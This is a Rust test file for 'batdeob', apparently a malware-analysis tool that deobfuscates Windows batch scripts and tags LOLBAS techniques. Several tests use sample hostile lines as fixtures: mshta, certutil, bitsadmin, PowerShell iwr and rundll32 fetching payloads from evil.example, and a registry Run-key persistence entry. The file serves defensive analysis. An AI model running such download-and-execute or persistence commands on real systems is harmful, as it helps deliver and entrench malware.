#![allow(clippy::expect_used, clippy::unwrap_used)]

use assert_cmd::Command;
use std::fs;
use tempfile::TempDir;

#[test]
fn deob_writes_deobfuscated_file() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "set X=hi\r\necho %X%\r\n").expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();
    let deob = out_dir.join("deobfuscated.bat");
    assert!(deob.exists(), "deobfuscated.bat not produced");
    let contents = fs::read_to_string(&deob).expect("read");
    assert!(contents.contains("echo hi"), "got:\n{}", contents);
}

#[test]
fn deob_writes_extracted_child_bat() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, r#"cmd /c "echo hi""#).expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let entries: Vec<_> = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().to_string())
        .collect();
    let has_child_bat = entries
        .iter()
        .any(|n| n.ends_with(".bat") && n != "deobfuscated.bat");
    assert!(has_child_bat, "no child .bat in {:?}", entries);
}

#[test]
fn deob_writes_traits_json() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "echo hi").expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let traits_path = out_dir.join("traits.json");
    assert!(traits_path.exists(), "traits.json missing");
    let contents = fs::read_to_string(&traits_path).expect("read");
    // Should parse as JSON array (possibly empty)
    let _: serde_json::Value = serde_json::from_str(&contents).expect("valid json");
}

#[test]
fn deob_writes_extracted_ps1() {
    use base64::Engine;
    let payload = "Write-Host hi";
    let utf16: Vec<u8> = payload
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);

    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, format!("powershell -EncodedCommand {}", b64)).expect("write");
    let out_dir = dir.path().join("out");
    Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "deob",
            input.to_str().expect("path"),
            "-o",
            out_dir.to_str().expect("path"),
        ])
        .assert()
        .success();

    let entries: Vec<_> = fs::read_dir(&out_dir)
        .expect("read out")
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().to_string())
        .collect();
    let has_ps1 = entries.iter().any(|n| n.ends_with(".ps1"));
    assert!(has_ps1, "no .ps1 in {:?}", entries);
}

#[test]
fn analyze_emits_json_to_stdout() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "echo plain\r\n").expect("write");
    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["analyze", input.to_str().expect("path")])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let s = String::from_utf8_lossy(&out.stdout);
    assert!(s.contains("\"deobfuscated\""), "stdout:\n{}", s);
}

#[test]
fn report_default_omits_raw_text_includes_full_traits() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "curl -o out.exe http://x.example.com/y.exe\r\n").expect("write");
    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["report", input.to_str().expect("path")])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let s = String::from_utf8_lossy(&out.stdout);
    // Full typed trait list lands in `traits`; analyst-friendly downloads
    // still in `downloads`; sha256 is computed.
    assert!(s.contains("\"traits\""), "stdout:\n{}", s);
    assert!(s.contains("\"downloads\""), "stdout:\n{}", s);
    assert!(s.contains("\"input_sha256\""), "stdout:\n{}", s);
    assert!(s.contains("x.example.com/y.exe"), "url missing: {}", s);
    // Source and deob are off by default.
    assert!(!s.contains("\"source\""), "default included source: {}", s);
    assert!(
        !s.contains("\"deobfuscated\""),
        "default included deob: {}",
        s
    );
}

#[test]
fn report_include_source_and_deob_inlines_both() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "set X=marker_XYZ\r\necho %X%\r\n").expect("write");
    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "report",
            "--include-source",
            "--include-deob",
            input.to_str().expect("path"),
        ])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr:\n{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let s = String::from_utf8_lossy(&out.stdout);
    assert!(s.contains("\"source\""), "source missing");
    assert!(s.contains("\"deobfuscated\""), "deobfuscated missing");
    // Source verbatim (json-escaped).
    assert!(s.contains("marker_XYZ"), "marker missing from source/deob");
}

#[test]
fn analyze_jsonl_emits_lines() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "curl http://x/y\r\n").expect("write");
    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["analyze", input.to_str().expect("path"), "--jsonl"])
        .output()
        .expect("run");
    assert!(out.status.success());
    let s = String::from_utf8_lossy(&out.stdout);
    let lines: Vec<&str> = s.lines().collect();
    assert!(lines.len() >= 2, "expected >=2 lines, got: {:?}", lines);
    // Each line is valid JSON
    for line in &lines {
        let _: serde_json::Value = serde_json::from_str(line).expect("valid json line");
    }
    // First line is meta
    let first: serde_json::Value = serde_json::from_str(lines[0]).expect("first line");
    assert_eq!(first["kind"], "meta");
}

#[test]
fn summarize_emits_compact_report() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "curl -o out.exe http://x/y.exe\r\nreg add HKLM\\Run /v Evil /d \"C:\\\\evil.exe\"\r\n",
    )
    .expect("write");
    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["summarize", input.to_str().expect("path")])
        .output()
        .expect("run");
    assert!(
        out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let s = String::from_utf8_lossy(&out.stdout);
    let v: serde_json::Value = serde_json::from_str(&s).expect("valid json");
    assert!(!v["downloads"].as_array().expect("downloads").is_empty());
    assert!(v["admin_commands"]["reg"].as_u64().expect("reg count") >= 1);
}

#[test]
fn summarize_can_enrich_lolbas_matches_from_external_json() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "mshta http://evil.example/payload.hta\r\n").expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 1, "unexpected matches: {matches:?}");
    assert_eq!(
        matches[0].get("name").and_then(|v| v.as_str()),
        Some("Mshta.exe")
    );
    assert_eq!(
        matches[0].get("lolbas_url").and_then(|v| v.as_str()),
        Some("https://lolbas-project.github.io/lolbas/Binaries/Mshta/")
    );
    assert_eq!(
        matches[0]
            .get("mitre_ids")
            .and_then(|v| v.as_array())
            .and_then(|ids| ids.first())
            .and_then(|v| v.as_str()),
        Some("T1218.005")
    );
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_output_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "curl -o C:\\Users\\Public\\mshta.exe http://evil.example/payload.bin\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_powershell_outfile_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        r#"powershell -NoProfile -Command "iwr http://evil.example/payload.bin -OutFile C:\Users\Public\mshta.exe""#,
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_positional_destination_paths() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "certutil -urlcache -split -f http://evil.example/payload.bin C:\\Users\\Public\\mshta.exe\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn summarize_lolbas_enrichment_matches_program_path_after_command_separator() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "certutil -urlcache -split -f http://evil.example/payload.bin C:\\Users\\Public\\payload.bin & C:\\Windows\\System32\\mshta.exe http://evil.example/\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 1, "unexpected matches: {matches:?}");
    assert_eq!(
        matches[0].get("name").and_then(|v| v.as_str()),
        Some("Mshta.exe")
    );
}

#[test]
fn summarize_lolbas_enrichment_ignores_program_names_in_non_exec_operands() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        concat!(
            "bitsadmin /transfer j http://evil.example/payload.bin C:\\Users\\Public\\mshta.exe\r\n",
            "certutil -decode C:\\Users\\Public\\mshta.exe C:\\Users\\Public\\payload.bin\r\n",
            "msiexec /i C:\\Users\\Public\\setup.msi /L*v C:\\Users\\Public\\mshta.exe\r\n",
            "copy C:\\Users\\Public\\payload.bin C:\\Users\\Public\\mshta.exe\r\n",
            "curl http://evil.example/payload.bin, C:\\Users\\Public\\mshta.exe\r\n",
        ),
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Mshta.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.005"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "summarize",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
}

#[test]
fn analyze_can_enrich_lolbas_matches_from_external_json() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(
        &input,
        "rundll32 url.dll,FileProtocolHandler http://evil.example/\r\n",
    )
    .expect("write input");
    let lolbas = dir.path().join("lolbas.json");
    fs::write(
        &lolbas,
        r#"[
          {
            "Name": "Rundll32.exe",
            "url": "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/",
            "Commands": [
              {
                "Category": "Execute",
                "MitreID": "T1218.011"
              }
            ]
          }
        ]"#,
    )
    .expect("write lolbas");

    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args([
            "analyze",
            input.to_str().expect("input path"),
            "--lolbas-json",
            lolbas.to_str().expect("lolbas path"),
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
    let matches = v
        .get("lolbas_matches")
        .and_then(|v| v.as_array())
        .expect("lolbas_matches array");
    assert_eq!(matches.len(), 1, "unexpected matches: {matches:?}");
    assert_eq!(
        matches[0].get("name").and_then(|v| v.as_str()),
        Some("Rundll32.exe")
    );
    assert_eq!(
        matches[0]
            .get("mitre_ids")
            .and_then(|v| v.as_array())
            .and_then(|ids| ids.first())
            .and_then(|v| v.as_str()),
        Some("T1218.011")
    );
}
